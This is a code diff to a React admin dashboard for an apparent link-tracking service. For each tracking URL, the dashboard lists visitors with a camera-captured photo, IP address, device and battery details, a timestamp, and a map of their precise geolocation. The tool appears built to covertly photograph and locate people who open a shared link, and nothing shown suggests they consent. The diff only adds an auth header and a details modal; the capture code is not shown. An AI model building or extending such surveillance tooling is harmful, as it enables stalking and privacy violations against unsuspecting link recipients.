@@ -4,13 +4,21 @@ import { useParams } from "react-router-dom";
 export default function AdminPanel() {
   const { shortId } = useParams();
 
-  // State Management
-  const [stats, setStats] = useState([]); // Master list of all tracking URLs
-  const [selectedShortId, setSelectedShortId] = useState(null); // Track which URL is being viewed
+  const [stats, setStats] = useState([]);
+  const [selectedShortId, setSelectedShortId] = useState(null);
+  const [selectedVisitor, setSelectedVisitor] = useState(null);
+  const [expandedImage, setExpandedImage] = useState(null);
+
 
   useEffect(() => {
     const fetchData = () => {
-      fetch(`https://user-tracking-1.onrender.com/api/auth/analytics/${shortId}`)
+      const token = localStorage.getItem("token");
+
+      fetch(`https://user-tracking-1.onrender.com/api/auth/analytics/${shortId}`, {
+        headers: {
+          Authorization: `bearer ${token}`,
+        },
+      })
         .then((res) => res.json())
         .then((data) => {
           if (data.logs) {
@@ -21,21 +29,25 @@ export default function AdminPanel() {
     };
 
     fetchData();
-     
-
-   
   }, [shortId]);
 
-   const activeEntry = stats.find((item) => item.shortId === selectedShortId);
+  const activeEntry = stats.find(
+    (item) => item.shortId === selectedShortId
+  );
+
   const visitorLogs = activeEntry ? activeEntry.analytics : [];
 
   return (
     <div className="admin-container">
       <h1>Admin Dashboard</h1>
-      
+
       <div className="table-container">
         <h3>Tracking URLs Overview</h3>
-        <table border="1" width="100%" style={{ borderCollapse: "collapse", textAlign: "left" }}>
+        <table
+          border="1"
+          width="100%"
+          style={{ borderCollapse: "collapse", textAlign: "left" }}
+        >
           <thead>
             <tr>
               <th>Tracking URL</th>
@@ -52,74 +64,158 @@ export default function AdminPanel() {
                   <td>{item.destinationUrl}</td>
                   <td>{item.clicks}</td>
                   <td>
-                    <button onClick={() => setSelectedShortId(item.shortId)}>
-                      {selectedShortId === item.shortId ? "Viewing..." : "View Details"}
+                    <button
+                      onClick={() => {
+                        setSelectedShortId(item.shortId);
+                        setSelectedVisitor(null); // reset modal
+                      }}
+                    >
+                      {selectedShortId === item.shortId
+                        ? "Viewing..."
+                        : "View Details"}
                     </button>
                   </td>
                 </tr>
               ))
             ) : (
               <tr>
-                <td colSpan="4" style={{ textAlign: "center", padding: "10px" }}>Loading stats...</td>
+                <td colSpan="4" style={{ textAlign: "center", padding: "10px" }}>
+                  no tracking url found
+                </td>
               </tr>
             )}
           </tbody>
         </table>
       </div>
 
-      {/* VISITOR DETAILS SECTION */}
       {selectedShortId && (
-        <div className="user-details"  >
-          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-             <button onClick={() => setSelectedShortId(null)}  >
-              ✕ Close Details
-            </button>
+        <div className="user-details">
+          <div
+            style={{
+              display: "flex",
+              justifyContent: "right",
+              alignItems: "center",
+            }}
+          >
+            <button onClick={() => setSelectedShortId(null)}>✕</button>
           </div>
-
+      <div className="log row py-5">
           {visitorLogs.length > 0 ? (
             visitorLogs.map((log, index) => (
-              <div key={index} className="device-box" style={{ borderBottom: "1px solid #ddd", marginBottom: "20px", paddingBottom: "10px" }}>
-                
-                
+              <div
+                key={index}
+                className="device-box  col-md-8 "
+               
+              >
                 <div>
-                  <div>
-                    <h4>Camera Capture</h4>
-                    {log.cameraImage ? (
-                      <img src={log.cameraImage} alt="User" width="250" style={{ borderRadius: "8px" }} />
-                    ) : (
-                      <p>No Image Captured</p>
-                    )}
-                  </div>
+                  <h4>Camera Capture</h4>
+                  {log.cameraImage ? (
+                    <img
+                      src={log.cameraImage}
+                      alt="User"
+                      width="150"
+                     onClick={() => setExpandedImage(log.cameraImage)} 
 
-                  <div>
-                    <h4>Device Info</h4>
-                    <p><b>IP:</b> {log.ip}</p>
-                    <p><b>Browser:</b> {log.browser}</p>
-                    <p><b>Platform:</b> {log.platform}</p>
-                    <p><b>Screen:</b> {log.screen}</p>
-                    <p><b>RAM:</b> {log.ram} GB</p>
-                    <p><b>CPU:</b> {log.cpuCores} Cores</p>
-                    <p><b>Battery:</b> {log.batteryLevel}% ({log.isCharging ? "Charging" : "Unplugged"})</p>
-                    <p><b>Captured At:</b> {new Date(log.timestamp).toLocaleString()}</p>
-                  </div>
+                      style={{ borderRadius: "8px" }}
+                    />
+                  ) : (
+                    <p>No Image Captured</p>
+                  )}
+
+                  <p>
+                    <b>IP:</b> {log.ip}
+                  </p>
+
+                  <button onClick={() => setSelectedVisitor(log)}>
+                    View Details
+                  </button>
                 </div>
-
-                <h4>Location Map</h4>
-                {log.latitude && log.longitude ? (
-                  
-              <iframe
-                title="location"
-                width="100%"
-                height="300"
-                src={`https://maps.google.com/maps?q=${log.latitude},${log.longitude}&z=15&output=embed`}
-              ></iframe>
-                ) : (
-                  <p>Location data not available for this visitor.</p>
-                )}
               </div>
             ))
           ) : (
             <p>No visitor logs found for this specific tracking URL.</p>
+          )}
+</div>
+          {/* Modal */}
+          {selectedVisitor && (
+            <div className="modal-overlay">
+              <div
+                className="modal-content"
+                
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "center",
+                  }}
+                >
+                  <h3>Visitor Details</h3>
+                  <button
+                    onClick={() => setSelectedVisitor(null)}
+                    className="close-btn"
+                  >
+                    ✕  
+                  </button>
+                </div>
+
+                <hr />
+
+                <div style={{ textAlign: "left", marginTop: "15px" }}>
+                  <h4>Device Info</h4>
+                  <p>
+                    <b>IP:</b> {selectedVisitor.ip}
+                  </p>
+                  <p>
+                    <b>Browser:</b> {selectedVisitor.browser}
+                  </p>
+                  <p>
+                    <b>Platform:</b> {selectedVisitor.platform}
+                  </p>
+                  <p>
+                    <b>Screen:</b> {selectedVisitor.screen}
+                  </p>
+                  <p>
+                    <b>RAM:</b> {selectedVisitor.ram} GB
+                  </p>
+                  <p>
+                    <b>CPU:</b> {selectedVisitor.cpuCores} Cores
+                  </p>
+                  <p>
+                    <b>Battery:</b> {selectedVisitor.batteryLevel}% (
+                    {selectedVisitor.isCharging
+                      ? "Charging"
+                      : "Unplugged"}
+                    )
+                  </p>
+                  <p>
+                    <b>Captured At:</b>{" "}
+                    {new Date(
+                      selectedVisitor.timestamp
+                    ).toLocaleString()}
+                  </p>
+                </div>
+
+                <h4 style={{ textAlign: "left", marginTop: "20px" }}>
+                  Location Map
+                </h4>
+
+                {selectedVisitor.latitude &&
+                selectedVisitor.longitude ? (
+                  <iframe
+                    title="location"
+                    width="100%"
+                    height="300"
+                    style={{ border: 0, borderRadius: "8px" }}
+                    src={`https://maps.google.com/maps?q=${selectedVisitor.latitude},${selectedVisitor.longitude}&z=15&output=embed`}
+                  ></iframe>
+                ) : (
+                  <p>
+                    Location data not available for this visitor.
+                  </p>
+                )}
+              </div>
+            </div>
           )}
         </div>
       )}
